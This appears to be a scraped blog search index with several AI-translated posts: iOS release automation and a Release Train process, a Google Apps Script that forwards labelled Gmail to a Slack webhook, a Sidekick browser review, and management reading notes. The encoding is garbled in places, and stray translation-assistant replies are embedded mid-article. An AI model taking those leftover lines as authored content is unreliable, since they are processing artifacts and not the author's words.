occurrences per month, it wastes 1,200 hours a year on unnecessary communication.Boost Efficiency ‚Äî Automate Repetitive TasksChapter 2: Sharing the Impact of Automating Repetitive Tasks on Improving Work EfficiencyI will use iOS as an example, but the same approach applies to Android.Will not mention technical implementation details, only discuss feasibility in principle.Organize the services we have used, including but not limited to: Slack: Communication Software Fastlane: iOS Automation Script Tool Github: Git Provider Github Action: Github‚Äôs CI/CD service, to be introduced later Firebase: Crashlytics, Event, App Distribution (to be introduced later), Remote Config‚Ä¶ Google Apps Script: The add-on scripting for Google Apps, to be introduced later Bitrise: CI/CD Server Onesky: Previously mentioned as a third-party tool for Localization Testflight: iOS App Beta Testing Platform Google Calendar: Google Calendar, its usage will be introduced later Asana: Project Management Tool Issues with Releasing the Beta VersionThe first repetitive issue is when we want to let teammates test the app early during development. Traditionally, we just borrow a phone to build the app. If there are only 1-2 people, it‚Äôs not a big problem, but if the team has 20-30 testers, just installing the test versions can take the whole day. Plus, if there are updates, the entire process has to be repeated.Another method is using TestFlight as a beta release platform, which I think is also good; but there are two issues. First, TestFlight is equivalent to a Production environment, not Debug. Second, when many teammates need to test different features simultaneously during development, TestFlight can get chaotic, and the packaged builds will be frequently changed. However, it is still feasible.Pinkoi‚Äôs solution is to first separate the task of ‚Äúhaving the App Team install the test version.‚Äù They use Slack WorkFlow as the input UI to achieve this. Once the input is completed, it triggers Bitrise to run a Fastlane script that packages and uploads the test ipa to Firebase App Distribution. For Slack Workflow applications, refer to this article: Slack builds a fully automated WFH employee health status reporting systemFirebase App DistributionTesters just need to follow the Firebase App Distribution steps to install the certificate and register their devices. Then, they can select the desired beta version to install on the platform or simply click the link in the email to install it directly. Note that iOS Firebase App Distribution uses Development Devices, with a limit of only 100 devices registered, counted by device not by user. So it may be necessary to balance this with the TestFlight solution (by person, external testing with 1,000 users).But at least the previous Slack WorkFlow UI Input can be considered for use. For advanced use, you can develop a Slack Bot to have a more complete and customized workflow and forms available.Recap the release of the beta automation results: the most noticeable improvement is moving the entire process to the cloud, allowing the App Team to be hands-off and fully self-service.Issues with Packaging the Official VersionThe second is also a common task for the App Team: packaging and submitting the official version of the app for review.When the team was small, development was single-threaded. App version updates were not a big issue and could be done freely or regularly.However, with a large team and multiple development and iteration demands running simultaneously, the situation shown in the above image occurs. Without proper ‚Äúinterface communication‚Äù as mentioned earlier, everyone works independently. This causes the App Team to be overwhelmed since app updates are more costly and complex than web updates. Additionally, frequent and chaotic updates disrupt the user experience.Finally, management issues arise. Without fixed processes and dates, it is difficult to optimize what needs to be done at each step.Ë´ãÊèê‰æõÊÇ®ÈúÄË¶ÅÁøªË≠ØÁöÑ Markdown ÊñáÁ´†ÊÆµËêΩÂÖßÂÆπÔºåÊàëÂ∞á‰æùÁÖßÊÇ®ÁöÑË¶ÅÊ±ÇÈÄ≤Ë°åÁøªË≠Ø„ÄÇThe solution is to introduce a Release Train into the development process. The core concept is to separate version updates from project development.We have fixed the schedule and determined what will be done at each stage: Update the new version every Monday morning Code freeze on Wednesday (No more merging feature PRs) QA starts on Thursday Official packaging every Friday Actual timelines (QA duration), release cycles (weekly, biweekly, monthly) can be adjusted according to each company‚Äôs situation. The core is to determine what to do at fixed times.This is a survey from foreign Twitter users about update cycles, mostly every two weeks.Taking weekly updates &amp; our multiple teams as examples, it would be like the image above.Release Train, as the name suggests, is like a train station, where each version is a train.If you miss it, you‚Äôll have to wait for the next one. Each Squad team and project can choose their own boarding time.This is a great communication interface. As long as everyone agrees and follows the rules, version updates can proceed smoothly and orderly.For more technical details about Release Train, please refer to: Mobile release trains ‚Äî Travelperk Agile Release Train Release Quality and Mobile Trains Once the process and schedule are finalized, we can optimize the tasks for each stage.For example, packaging a release version manually is time-consuming and labor-intensive. The entire process of packaging, uploading, and submitting for review takes about an hour. During this time, you must constantly switch tasks, making it hard to do other work. Repeating this process for every package wastes a lot of productivity.Since our schedule is fixed, we directly integrate Google Calendar here, adding the planned tasks to the calendar. When the time comes, Google Apps Script will call Bitrise to run Fastlane, packaging the official version and submitting the review script to complete all tasks.Another advantage of integrating with Google Calendar is that if unexpected situations arise requiring a delay or an earlier time, you can simply go in and change the date directly. To automatically run a Google Apps Script when a Google Calendar event starts, you currently need to use your own on service. For a quick solution, you can use IFTTT as a bridge between Google Calendar and Bitrise/Google Apps Script. The method can be found in this article.p.s. Currently, the Pinkoi iOS Team uses the Gitflow workflow. In principle, this consensus must be followed by all teams, so requests that break this rule are not desired (e.g., special Wednesday releases). However, for projects involving external collaboration, flexibility should be maintained since this consensus is internal to the team. HotFixes for critical issues can be updated at any time and are not subject to the Release Train rules.Here, Google App Scripts applications are additionally mentioned. For details, please refer to: ÈÅãÁî® Google Apps Script ËΩâÁôº Gmail ‰ø°‰ª∂Âà∞ Slack .The last one is using Github Action to improve collaboration efficiency (PR Review).Github Action is Github‚Äôs CI/CD service, which can be directly linked to Github events. Trigger timings include opening an issue, opening a PR, merging a PR, and more.Github Actions can be used with any Git project hosted on Github. There are no restrictions for public repositories, and private repositories have a free monthly quota of 2,000 minutes.Here are two features: (Left) After PR Review is completed, the reviewer name Label will be automatically added, allowing us to quickly summarize the PR review status. (On the right) is a tool that organizes and sends messages to a Slack Channel at fixed times daily, reminding teammates which PRs are waiting for review (modeled after Pull Reminders‚Äô features). Github Actions offer many automation possibilities; everyone can use their imagination.Like the issue bots often seen in open source projects:fastlane / fastlaneAutomatically closing PRs that have not been merged for a long time can also be done using GitHub Actions.Recap the results of automating the official version packaging, still using existing tools for integration; besides automation, a fixed process was added to double work efficiency.Originally, besides the manual packaging time, there was additional communication time for deployment, which is now reduced to zero; as long as you ensure to board within the schedule, all the time can be focused on ‚Äúdiscussion‚Äù and ‚Äúdevelopment.‚ÄùIn total, these two automations save 216 work hours per year.With automation combined with the previously mentioned communication interface, let‚Äôs see how much efficiency can be improved by doing these tasks.Besides the projects we just completed, we also need to evaluate the cost of flow switching. After working continuously for a period, we enter a ‚Äúflow‚Äù state where our thoughts and productivity peak, enabling the most effective output. However, if interrupted by unnecessary matters (e.g., redundant communication, repetitive tasks), it takes time to return to flow again. Here, we use 30 minutes as an example.The cost of switching flow due to unnecessary interruptions should also be considered. Here, we estimate 30 minutes per interruption, occurring 10 times a month. For 60 people, this results in 3,600 wasted hours per year.Flow switching cost (3,600) + extra communication due to poor interface (1,200) + repetitive tasks solved by automation (216) = over 5,016 hours lost in a year.The time originally wasted on work can be saved and invested in other more valuable tasks, so the actual productivity gain should be multiplied by another 200%. Especially as the team size continues to grow, the impact on work efficiency also increases. Optimize early, enjoy early; optimize late, no discount!!Recap of the insider details of a high-efficiency work team: what we mainly did. No Code/Low Code First Prioritize existing tool integration (as shown in this example). Only evaluate automation costs and actual savings if no existing tools are available.Support for CultureOn Pinkoi, Everyone Can Be a Problem-Solving LeaderFor solving problems and making changes, the vast majority require the collective effort of many teams to improve. This greatly depends on the support and encouragement of company culture; otherwise, driving progress alone can be very difficult. At Pinkoi, anyone can be a problem-solving leader. You don‚Äôt have to be a Lead or PM to solve problems. Many communication interfaces, tools, or automation projects introduced earlier were discovered by teammates who proposed solutions, and everyone worked together to complete them.Regarding how team culture supports driving change, the four stages of problem-solving can all be linked to Pinkoi‚Äôs Core Values.Step 1 Grow Beyond Yesterday Good but strive for better. If any issues are found, no matter how small, as mentioned earlier, with the team‚Äôs growth, even small problems can have amplified effects. Investigate and summarize issues to avoid premature optimization (some problems may be only temporary). Next is Build Partnerships Actively communicate on all fronts to gather suggestions Maintain empathy (since some solutions might be the best option for the other party, so careful consideration is needed) Step 3: Impact Beyond Your Role Leverage Your Influence Propose a Problem-Solving Plan If related to repetitive tasks, prioritize using automation solutions Remember to maintain flexibility and scalability, and avoid over-engineering. Finally, Dare to Fail! Be Brave to Take Action Continuous Monitoring and Dynamic Solution Adjustment After achieving success, remember to share the results with the team to promote cross-departmental resource integration (because the same issue may exist in multiple departments simultaneously) The above is a sharing from the Pinkoi high-efficiency engineering team. Thank you all.Join Pinkoi now¬†¬ª&gt; https://www.pinkoi.com/about/careersIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Google Apps ScriptÔΩúAutomate Gmail Forwarding to Slack Channels with Custom Filters", "url": "/posts/zrealm-dev/google-apps-script-automate-gmail-forwarding-to-slack-channels-with-custom-filters-d414bdbdb8c9/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, google-apps-script, ci-cd, slack, workflow-automation", "date": "2021-08-07 20:19:49 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Using Google Apps Script to Forward Gmail Emails to SlackUsing Gmail Filter + ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Using Google Apps Script to Forward Gmail Emails to SlackUsing Gmail Filter + Google Apps Script to Automatically Forward Customized Content to a Slack Channel When Receiving EmailsPhoto by Lukas BlazekOriginRecently, I have been optimizing the iOS App CI/CD process using Fastlane as the automation tool. After packaging and uploading, if you want to continue with the automatic submission step (skip_submission=false), you need to wait for Apple to complete the processing, which takes about 30-40 minutes of CI server time. Since Apple‚Äôs App Store Connect API is not fully developed, Fastlane can only check once per minute whether the uploaded build has finished processing, which wastes a lot of resources. Bitrise CI Server: Limits the number of simultaneous builds and sets a maximum runtime of 90 minutes. While 90 minutes is sufficient, a single build can block others from running. Travis CI Server: Charged based on Build Time, so you can‚Äôt afford to wait‚Äîmoney goes down the drain. A Different ApproachNo waiting, end immediately after upload! Trigger subsequent actions based on the processed email notification. However, I haven‚Äôt received this email recently. I‚Äôm not sure if it‚Äôs a settings issue or if Apple has stopped sending such notifications.This article will use the Testflight email notification that testing can now begin as an example. The complete process is shown in the above image and is feasible in principle; however, this article will focus on receiving emails and using Apps Script to forward them to a Slack channel.How to Forward Received Emails to a Slack ChannelBoth paid and free Slack plans can use different methods to forward emails to Slack Channels or DMs.You can refer to the official documentation for setup: Send emails to SlackThe results are the same regardless of the method: By default, the email content is collapsed. Click to expand and view the full content.Advantages: Simple and Fast Zero Technical Barrier Real-time forwarding Disadvantages: Cannot customize content Display style cannot be changed Custom Forwarded ContentThis is the main focus of this article.Translate the email content data into your desired presentation style, as shown in the example image above.Here is a complete workflow diagram: Using Gmail Filter to Add Identification Labels for Forwarded Emails Apps Script to Periodically Fetch Emails Tagged with a Specific Label Read email content Render the desired display style Send messages to Slack via Slack Bot API or directly using Incoming Message Remove Email Label (Indicates Forwarded) Completed First, create a filter in GmailFilters can automate actions when receiving emails that meet certain criteria, such as: automatically marking as read, tagging, moving to spam, categorizing, and more.In Gmail, click the advanced search icon button at the top right, enter the forwarding email rule conditions, such as From: no_reply@email.apple.com + Subject contains is now available to test., then click ‚ÄúSearch‚Äù to check if the filter results are as expected; if correct, click the ‚ÄúCreate filter‚Äù button next to Search.Or simply click ‚ÄúFilter messages like these‚Äù at the top of the email to quickly create a filter. This button design is very user-unfriendly; I couldn‚Äôt find it the first time.Next, set the action for emails that meet this filter condition. Here, select ‚ÄúApply the label‚Äù and create a new label named ‚Äúforward-to-slack.‚Äù Then click ‚ÄúCreate filter‚Äù to finish.Emails labeled with this tag will be forwarded to Slack.Get Incoming WebHooks App URLFirst, we need to add the Incoming WebHooks App to the Slack Channel. We will use this to send messages. Slack bottom left corner ‚ÄúApps‚Äù -&gt; ‚ÄúAdd apps‚Äù Search for ‚Äúincoming‚Äù in the search box on the right. Click ‚ÄúIncoming WebHooks‚Äù -&gt; ‚ÄúAdd‚Äù Select the Channel where you want to send the message.Note down the ‚ÄúWebhook URL‚Äù at the top.Scroll down to set the name and avatar displayed when sending messages from the Bot; remember to click ‚ÄúSave Settings‚Äù after making changes. Note Please note that the official recommendation is to use the new Slack APP Bot API‚Äôs chat.postMessage to send messages. The simpler Incoming Webhook method will be deprecated in the future. This guide uses the old method for convenience but will need to switch to the new Slack App API in the next chapter, ‚ÄúImport Employee List.‚ÄùWriting Apps Script Code Click here to go to my Apps Script project Click ‚ÄúNew Project‚Äù at the top left After creating, click the project name to rename it, e.g., ForwardEmailsToSlack Paste the basic code below and modify it to your desired version:function sendMessageToSlack(content) { var payload = { \"text\": \"*You have received an email*\", \"attachments\": [{ \"pretext\": \"Email content as follows:\", \"text\": content, } ] }; var res = UrlFetchApp.fetch('Ë≤º‰∏ä‰Ω†ÁöÑSlack incoming Webhook URL',{ method : 'post', contentType : 'application/json', payload : JSON.stringify(payload) })}function forwardEmailsToSlack() { // Reference: https://gist.github.com/andrewmwilson/5cab8367dc63d87d9aa5 var label = GmailApp.getUserLabelByName('forward-to-slack'); var messages = []; var threads = label.getThreads(); if (threads == null) { return; } for (var i = 0; i &lt; threads.length; i++) { messages = messages.concat(threads[i].getMessages()) } for (var i = 0; i &lt; messages.length; i++) { var message = messages[i]; Logger.log(message); var output = '*New Email*'; output += '\\n*from:* ' + message.getFrom(); output += '\\n*to:* ' + message.getTo(); output += '\\n*cc:* ' + message.getCc(); output += '\\n*date:* ' + message.getDate(); output += '\\n*subject:* ' + message.getSubject(); output += '\\n*body:* ' + message.getPlainBody(); sendMessageToSlack(output); } label.removeFromThreads(threads);}Advanced: Slack message styles can refer to this official structure document. You can use Javascript‚Äôs Regex Match Function to extract content from emails. EX: Extracting version number information from Testflight approval emails:Email Subject: Your app XXX has been approved for beta testing.Email content:We want to get the values after Bundle Version Short String and Build Number.var results = subject.match(/(Bundle Version Short String: ){1}(\\S+){1}[\\S\\s]*(Build Number: ){1}(\\S+){1}/);if (results == null \\\\|\\\\| results.length != 5) { // not valid} else { var version = results[2]; var build = results[4];} For Regex usage, refer to here You can test if a Regex is correct online using this website Give it a try Go back to Gmail and manually add the label ‚Äúforward-to-slack‚Äù to any email. In the Apps Script code editor, select ‚ÄúforwardEmailsToSlack‚Äù and then click the ‚ÄúRun‚Äù button If ‚ÄúAuthorization Required‚Äù appears, click ‚ÄúContinue‚Äù to complete the verification.During the authentication process, the message ‚ÄúGoogle hasn‚Äôt verified this app‚Äù may appear. This is normal because the App Script we wrote has not been verified by Google. However, it‚Äôs fine since this is for personal use.You can click the bottom left corner ‚ÄúAdvanced‚Äù -&gt; ‚ÄúGo to ForwardEmailsToSlack (unsafe)‚ÄùClick ‚ÄúAllow‚ÄùForwarded successfully!!!Set Up Trigger (Schedule) for Automatic Checking &amp; ForwardingIn the left menu of Apps Script, select ‚ÄúTriggers‚Äù.Bottom left corner ‚Äú+ Add Trigger Condition‚Äù. Error Notification Settings: You can set how to notify you when the script encounters an error during execution Choose the function you want to execute: Select Main Function sendMessageToSlack Select Activity Source: You can choose from Calendar or Time-Driven (Scheduled or Specified) Select time-based trigger type: choose to execute on a specific date or once every minute/hour/day/week/month Select interval by minute/hour/day/week/month: e.g., every minute, every 15 minutes‚Ä¶ Here, for demonstration, it is set to run every minute. I think checking emails once every hour is sufficient for real-time needs. Go back to Gmail and pick any email, then manually add the label ‚Äî ‚Äúforward-to-slack‚Äù Waiting for schedule trigger Automatic Check &amp; Forward Successful!CompletionWith this feature, you can achieve customized email forwarding and processing, or even use it as a trigger‚Äîfor example, automatically running a script when receiving an email from XXX.Returning to Chapter 1 Origin, we can use this mechanism to improve the CI/CD process; no need to wait idly for Apple to finish processing, and we can integrate automation workflows!Further Reading Crashlytics + Big Query Build a More Real-Time and Convenient Crash Tracking Tool Crashlytics + Google Analytics Automatic Query for App Crash-Free Users Rate Automate Routine Tasks with Python + Google Cloud Platform + Line Bot Slack Builds Fully Automated WFH Employee Health Status Reporting System The app uses HTTPS for transmission, but data was still stolen. If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Boost ProductivityÔΩúSwitch from Chrome to Sidekick Browser for Enhanced Workflow", "url": "/posts/zrealm-life/boost-productivity-switch-from-chrome-to-sidekick-browser-for-enhanced-workflow-118e924a1477/", "categories": "ZRealm Life.", "tags": "english, ai-translation, sidekick, chrome, chromium, browsers, lifestyle", "date": "2021-08-07 13:06:43 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Productivity Tools] Ditch Chrome and Embrace the Sidekick BrowserSidekick Bro...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Productivity Tools] Ditch Chrome and Embrace the Sidekick BrowserSidekick Browser Features Introduction &amp; User Experience2024 UpdateAround early 2023, I switched to using Arc Browser. It offers a better experience, more features, fewer bugs, and supports cross-device syncing.Here‚Äôs a link to download Arc, the browser I was telling you about!https://arc.net/gift/f86ef8b3IntroductionI learned about the Sidekick browser from a colleague‚Äôs recommendation. Honestly, I didn‚Äôt have high expectations at first. Over the years, I‚Äôve considered abandoning Chrome and tried Safari, Safari‚Äôs beta version, Firefox, Opera, and third-party browsers based on open-source engines. However, I repeatedly failed and ended up reinstalling Chrome within a few days. Another reason is that I haven‚Äôt actively followed the browser market, so there might have been browsers that met my needs all along, but I just didn‚Äôt know about them.Failure ReasonsThe main reason is that the extensions I often use are not fully supported. I‚Äôm too reliant on and accustomed to Chrome‚Äôs extensions. Secondly, even though the Chromium core supports them smoothly, there are no standout features, so the experience is similar to using Google Chrome.My Requirements Chromium core, because it needs to support the extensions I frequently use More unique features to help boost productivity Supports MacOS. I usually use Safari on iOS, so cross-device support is not required. Excellent Memory Management Enhance Privacy Anti-Tracking Painless Transfer Feature Regarding productivity features, there are actually tens of millions of tools available as Chrome extensions. You can search and combine them yourself to achieve results; however, we haven‚Äôt conducted any research or surveys, so honestly, we are not sure which processes and features truly boost productivity.About Sidekick Development Team: Sidekick startup team founded in 11/2020 @ San Francisco / Currently fundraising Browser Engine: Chromium Current Stage: early access Core Value: A browser designed specifically for workflow optimization and productivity enhancement Supported platforms: Windows, Mac OS, Mac OS (M1), Linux (deb), Linux (rpm) Extensions: Support all Chrome Store extensions (bitwarden, lastpass, 1password, grammarly, google translate‚Ä¶) Official website: www.meetsidekick.com Download and Use Now Click here to visit the official website Click ‚ÄúDownload Now‚Äù Select the version that fits your operating system Download &amp; complete the installation Activate Sidekick The Sidekick introduction page appears. Click ‚ÄúContinue‚Äù at the top to proceed.Use Google, Microsoft, or create a Sidekick account directly; this account is for the Sidekick service and is unrelated to Google or Microsoft.‚¨áÔ∏è‚¨áÔ∏è‚¨áÔ∏è If you are switching from Chrome to Sidekick, please finish reading this section before continuing to create an account ‚¨áÔ∏è‚¨áÔ∏è‚¨áÔ∏è Unlike Chrome, where the installed browser account is directly linked and synced with the Google account‚Äôs browser data; you will notice that after logging into Sidekick, no data is imported. This is because Google currently blocks all third-party services from accessing the sync feature, so Sidekick cannot sync or import data directly through the account.The personnel data section cannot sync with Google account information either.Sidekick Sync Settings: Only the search terms are syncedHow to Import Data from Chrome?The official method is very roundabout, but for now, it‚Äôs the only way.If you are already a Chrome user, you can skip steps 1 to 3. Download &amp; Install Chrome Log in to Chrome Complete Syncing Browser Data on Google Account to Chrome Completely Quit Chrome ( ! Important ! MacOS users, please ensure there is no dot below the Chrome icon in the Dock) Continue from the previous step to create an account The first time you create an account, it will ask which browser you want to import data from. Choose Chrome Wait for the import to complete After importing, all bookmarks, browsing history, saved passwords, logged-in website sessions, and extensions will be seamlessly transferred to Sidekick; only a few services require re-login, while the rest do not, making it a painless transition! There is a minor issue here: if you do not create a new account (e.g., reinstall), only bookmarks, browsing history, and saved passwords can be transferred; extensions cannot be imported automatically. Checking the official Q&amp;A only suggests reinstalling from the Chrome extension or app store yourself.Sync issues?Since Google blocks third-party access to cloud data, how can we solve the bookmark synchronization issue across devices?Sidekick will soon release Sidekick Sync to solve this issue . This article uses my personal computer, not a work device; therefore, it includes social and entertainment websites. Please understand.FeaturesPainless TransferAs mentioned in the installation steps, after opening the app for the first time and creating an account to log in, you can seamlessly transfer all bookmarks, browsing history, saved passwords, logged-in website sessions, and extensions from existing Safari, Chrome, and Edge browsers.Logged-in website sessions and extensions provide the best experience in my opinion. Traditional browsers only transfer bookmarks, but you have to log in to all websites again and reinstall all extensions, which is very frustrating.Powerful Home Page FeaturesUnlike Chrome‚Äôs plain homepage and without the hassle of finding a homepage solution, Sidekick comes with a beautiful and convenient homepage feature. The search bar can search browsing history and bookmarks; if no results are found, it automatically switches to Google search. The top-left corner displays data on anti-tracking, memory management, and ad-blocking status. Shows today‚Äôs date and current time. The top section is called the Tab, and the upper part of the left toolbar is called the Application. The homepage background image can be customized or set to automatically display landscape photos. Application FeaturesNot just a quick access to websites, it works like the MacOS Dock. When an Application website is activated, it stays resident in the browser (indicated by a small dot on the left) while managing memory efficiently. If the active website has notifications, it will display a numbered badge as an alert.Applications can be quickly added from the homepage, or created from the Tab by manually entering the URL and ICON image.Sidekick has built-in access to hundreds of productivity tool websites, allowing quick addition to the Application. If the Application does not appear in the left Sidebar after adding it from the homepage, you can drag it there manually.Right-clicking on the Application allows quick access to recently viewed items and also supports multiple account switching. Few websites support multi-account switching; if unsupported, use Private Mode first. Currently tested Slack and Notion both support it. The Application section on the left and the Tab at the top do not affect each other. The Application block is independent and will not appear in the top Tab.Each app can be individually configured, such as turning off notifications or disabling badges.Window Split FeatureAlthough MacOS has a built-in window split feature, I rarely use it; unless I want to fully enter a focused state. Most of the time, I need to view web content alongside other MacOS apps, and in this case, the browser‚Äôs split window feature is very useful!For example, this way you can attend online classes and take notes simultaneously.The size of the middle divider can be freely dragged and adjusted.Usage: Simply click the split window button at the top right of the browser, select the window to add to the left side, and click again to close the split.Spotlight FeatureSimilar to MacOS Spotlight, you can press ‚ÄúOption‚Äù + ‚Äúf‚Äù in any window to perform a full browser search. You can use ‚ÄúOption‚Äù + ‚Äúz‚Äù or ‚ÄúControl‚Äù + ‚Äútab‚Äù to quickly switch tabs. ‚ÄúOption‚Äù + ‚Äú1‚Äì9‚Äù quickly switches to Tab positions 1 to 9 Tab Saver (Save Sessions) FeatureLike the popular Tab Saver extension on Chrome, it allows you to quickly save currently open tabs and switch between them, making it easier to manage different work states.Click the ‚ÄúF‚Äù (First Session) at the bottom left to enter the Session management page.Click ‚ÄúAdd new session‚Äù above to save the current Tab state and open a fresh, clean browsing environment.You can switch between Sessions and click ‚ÄúActivate‚Äù to restore the Tab. Session will not affect the active Application on the left. You can quickly switch sessions using the shortcut ‚ÄúOption‚Äù + ‚ÄúW‚Äù. ‚ÄúOption‚Äù + ‚Äú‚¨ÜÔ∏è‚Äù + ‚ÄúW‚Äù for Session Management Excellent Application Notification FeaturesIn fact, from now on, as long as a communication service offers a web version, you can use the Sidekick Application directly without installing a desktop app; as mentioned earlier, the application‚Äôs notification feature works just like a desktop app, providing real-time and complete alerts. Remember to authorize Sidekick to send desktop notifications; this way, web notifications will appear on your computer.Notes FeatureBuilt-in integration with Google Keep cloud notes. Click the document icon at the bottom left to quickly open Google Keep for note-taking.Google Keep is stored in the cloud under your Google account and supports cross-platform, cross-device note syncing and access.You can use this feature to quickly record notes. Not sure if it will be changed to their own Sidekick Sync in the future, as that would allow for better optimization and integration. You can quickly switch sessions using the shortcut ‚ÄúOption‚Äù + ‚ÄúN‚Äù.Built-in Anti-Tracking, Ad Blocking, and Memory Management FeaturesThe wave of privacy concerns is rising, and major companies are gradually focusing on user privacy, with Apple as the main leader. The new version of Safari has built-in privacy protection features; however, as the biggest beneficiary of privacy data, Google Ads will likely make little change in Google Chrome. Chromium != Chrome, Chromium is the open-source project of the browser‚Äôs core technology.Although Chromium is also led by Google, its open-source nature allows any developer to optimize based on its core. Sidekick uses this approach to enhance Chromium, retaining Chrome‚Äôs features while improving the functions Chrome lacks.Details If you are a dual-monitor user, you can also drag a tab into a separate window; the separate window will not have the left sidebar. Supports all Chrome extensions, can be downloaded and installed directly from the store More features await your exploration and experience!Cost ‚ÄúNot making a profit is a sin for a business (If you don‚Äôt make money, it‚Äôs a sin against society because we use society‚Äôs funds and talents. Without sufficient profits, we waste valuable social resources that could be used more effectively elsewhere.)‚Äù - Panasonic Founder ‚Äî Konosuke Matsushita (Text referenced from Business Thinking Academy)A good product needs a healthy cash flow to provide better service and sustain longer; below are Sidekick‚Äôs pricing details:For personal use, the free plan is more than enough, but if you can, consider supporting the development team! Currently, all users who joined are under the Early Access plan and seem unaffected by the Free plan (I have more than 5 Sidebar apps without any issues). Now inviting 10 users for 6 months Pro / 20 users for lifetime Pro; if you like this article, you can download and install via the link in the article to support me and Sidekick! Summary of User ExperienceAfter using it for a while, thanks to the painless transition, I have completely abandoned Chrome. There‚Äôs nothing that requires me to go back to Chrome. The best feature is still the Applications on the left side, where you can add frequently used work websites for quick switching and to get the latest notifications.In the past, I used to get lost in chaotic tabs or could only use Pin Tab to keep important work services pinned at the front; however, switching between them was still painful and required searching.When I want to do a Code Review, I click Github; when submitting an app for review, I click App Store Connect; when checking a project, I click Asana. It makes work very efficient.Regarding memory management, no specific research or testing was conducted; the optimization effect is uncertain, but having it is better than not. The only concern is that this product is still very new, so it‚Äôs uncertain how far it can go; if mismanaged, development and maintenance might stop, which would be a great pity! So please help promote and support it strongly!Further Reading Is Using Google Sites to Create a Personal Website Still Up-to-Date? Create a ‚ÄúFake‚Äù Transparent Perspective iPhone Wallpaper Easily Medium Custom Domain Feature Returns ZReviewsBot ‚Äî Slack App Review Notification Bot If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Leading SnowflakesÔΩúEngineering Manager Handbook Insights for Effective Team Leadership", "url": "/posts/leading-snowflakes-engineering-manager-handbook-insights-for-effective-team-leadership-1c9eafd4a190/", "categories": "", "tags": "english, ai-translation, management, leadership, engineering, management-science, engineer", "date": "2021-07-25 15:44:20 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Leading Snowflakes ‚Äî Reading Notes‚ÄúLeading Snowflakes The Engineering Manager ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Leading Snowflakes ‚Äî Reading Notes‚ÄúLeading Snowflakes The Engineering Manager Handbook‚Äù ‚Äî Oren EllenbogenAs a new manager, everything felt confusing; my knowledge of management was limited to compiling previous work experiences, observations, or casual chats with colleagues. I knew which actions by supervisors were positive and which were negative from the perspective of their subordinates. That was about all I had‚Äîfragmented knowledge without a systematic concept. So, I started reading books and began recording each author‚Äôs experiences. When encountering similar situations, having this ‚Äúknowledge confidence‚Äù helped me avoid panic.Leading Snowflakes Please provide the Markdown paragraphs you want me to translate into English. Author: Oren Ellenbogen Publication Year: 2013 Official Website Thanks to Êµ∑Á∏ΩÁêÜ for the recommendation The author has spent nearly 20 years progressing from a software engineer to management roles. He has served as a Technical Lead and Engineering Manager in both large corporations and startups. This book clearly outlines the challenges engineers face when moving into management and the methods to organize and solve them.I find it very similar to my background, both originally in software development and just starting in management; the key points mentioned in the book taught me many practical methods! - This article is a personal note combined with some personal opinions. In this age of fragmented information, it is highly recommended to read the original book yourself to systematically grasp the core ideas. - The purpose of notes is to make it easier to quickly locate points you want to review later. - Some content is directly quoted from the original text.Lesson 1. ‚Äî Switch between ‚ÄúManager‚Äù and ‚ÄúMaker‚Äù modesTransition from Engineer (Maker) to ManagerCompleting tasks well and elegantly solving problems are measures of an excellent engineer, but as a manager, the evaluation is not based on the ability to complete tasks. We have already proven this. Instead, the standard is leading, driving, and improving the team‚Äôs capabilities and goals.However, you cannot completely detach yourself from the task, as fully disconnecting from the task details may lead to losing connection with team members, which poses significant long-term risks to execution results, priorities, and trust.So being a manager doesn‚Äôt mean you don‚Äôt do engineering tasks; rather, you need to engage in both. It‚Äôs about finding the right balance between being an engineer (Maker) and a manager (Manager).As engineers, we like to have uninterrupted time to stay in context and solve difficult problems; but as managers, we need to frequently step out to help the team and care for teammates, so being interrupted is actually part of a manager‚Äôs job.But we also 